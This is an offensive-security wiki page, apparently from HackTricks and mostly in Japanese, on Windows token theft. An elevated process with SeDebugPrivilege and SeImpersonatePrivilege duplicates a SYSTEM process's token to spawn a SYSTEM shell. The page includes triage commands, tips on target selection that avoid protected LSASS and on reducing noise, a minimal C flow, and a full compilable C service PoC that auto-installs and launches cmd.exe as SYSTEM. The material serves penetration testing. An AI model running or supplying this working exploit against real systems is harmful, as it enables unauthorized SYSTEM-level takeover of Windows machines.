# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

このページでは、すでに **`SeDebugPrivilege`** と **`SeImpersonatePrivilege`** を持つ **High Integrity** コンテキストが、適切な **SYSTEM** プロセスを開き、その **token** を **duplicates** して、その token で **new process** を **spawns** する **manual token-theft** variant について説明します。

特権を持つ admin process から素早く **SYSTEM** shell を取得したいだけの場合は、こちらも確認してください。

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

process-handle path はないものの **`SeImpersonatePrivilege`** がある場合は、**named-pipe / Potato** route のほうが通常は簡単です。

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

token-copy path を試す前に、現在の process がすでに有用なコンテキストで実行されていることを確認します。
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** は、DACL によって通常はブロックされる場合でも、多くの **non-protected** な SYSTEM プロセスを開けるようにする権限です。
- **`SeImpersonatePrivilege`** は、その後に **`CreateProcessWithTokenW`** を実用的に使えるようにする権限です。
- token-copy path で弱い、または filtered された SYSTEM token しか取得できない場合は、**別の SYSTEM process** から steal してください。

## target process は慎重に選ぶ

この technique は通常 **`lsass.exe`** に対して示されますが、modern Windows では、それがしばしば**誤った target**になります。

- LSA Protection / RunAsPPL が有効な場合、**`lsass.exe`** は protected であり、**`SeDebugPrivilege`** を持つ通常の admin process でも開けません。<sup>[[2]](#references)</sup>
- **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**、または早期に起動された **`svchost.exe`** instance などの **non-PPL SYSTEM process** を優先してください。
- **Protected process** や、**`System`**、**`csrss.exe`** などの一部の特殊な process は、この technique の user-mode target として現実的ではありません。
- elevated で **Process Hacker / Process Explorer** を実行して、token を duplicate する前に、target token が実際に必要な privileges を持っているか確認してください。

## 実際の運用で重要な API details

多くの公開 PoC は **`PROCESS_ALL_ACCESS`** と **`TOKEN_ALL_ACCESS`** を要求しますが、これは必要以上に noisier です。実際には次のようにします。

- 必要な rights だけを使用して target process を開きます（一般的には **`PROCESS_QUERY_INFORMATION`** または **`PROCESS_QUERY_LIMITED_INFORMATION`**）。
- process creation に必要な rights で token を開きます：**`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**。
- **`DuplicateTokenEx(..., TokenPrimary, ...)`** を使用して **primary token** を作成します。impersonation token だけでは新しい process を作成できません。
- **`CreateProcessWithTokenW`** が **`1314`** で失敗する場合は、**`CreateProcessAsUserW`** に切り替えます。
- **service / Session 0** から launch する場合、**`CreateProcessWithTokenW`** は child を**caller の session** に保持する点に注意してください。表示可能な desktop shell が必要な場合は、**`CreateProcessAsUserW`** を使用して token を目的の session に移動します。<sup>[[1]](#references)</sup>

最小限の modern flow は次のようになります：
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

以下のコードは、**`SeDebugPrivilege` と `SeImpersonatePrivilege` の権限を悪用**して、**SYSTEM として実行されているプロセス**から、**すべての token privileges を持つ token**をコピーします。この場合、このコードは **Windows service binary** としてコンパイルして使用することで、この primitive が機能することを検証できます。<sup>[[3]](#references)</sup>

**elevation が発生するコードの主要部分**は、**`Exploit`**関数内にあります。この関数では、**`lsass.exe`**を検索し、その**token をコピー**し、最後にその token を使用して、コピーした token のすべての privileges を持つ新しい **`cmd.exe`**を起動していることが確認できます。

modern host では、通常 **`lsass.exe`**を、**`winlogon.exe`**、**`wininit.exe`**、または **`services.exe`**などの別の **non-PPL SYSTEM process**に置き換えます。

すべて、または token privileges の大部分を持つ SYSTEM として実行されているその他のプロセスには、**`services.exe`**、**`svchost.exe`**（最初のいくつか）、**`wininit.exe`**、**`csrss.exe`**などがあります。一般的に、**protected process から token をコピーすることはできない**ことに注意してください。
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## 参考資料

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Running my program as a service (cboard.cprogramming.com) – PoCで使用されるWindows service skeleton](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
